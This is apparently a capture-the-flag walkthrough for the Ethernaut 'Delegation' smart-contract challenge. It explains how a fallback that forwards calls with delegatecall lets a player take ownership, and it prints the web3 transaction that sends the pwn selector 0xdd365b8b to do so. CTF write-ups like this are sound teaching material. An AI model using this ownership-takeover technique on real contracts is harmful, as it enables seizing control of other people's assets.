The contract accessible from the console has the class `Delegation`:

```js
// contains a fallback method, contrary to the Delegate class 
contract.abi
// 0x73379d8B82Fda494ee59555f333DF7D44483fD58
await contract.owner()
// 0xAAD026992b0065D4A9c7019B082cb748D042411F
player
```

Calling the `pwn` function from the context of the `Delegation` contract will change its owner.
And this is exactly what the fallback method allows, thanks to the `delegatecall`!

To point the `delegatecall` to the right function, it requires the encoded name and input of the function `pwn`.
This can be found in the ABI, or by just calling the `pwn` function: `0xdd365b8b`.

Finally, pass this data to the fallback funtion from `Delegation`:

```js
web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  data: '0xdd365b8b',
})
```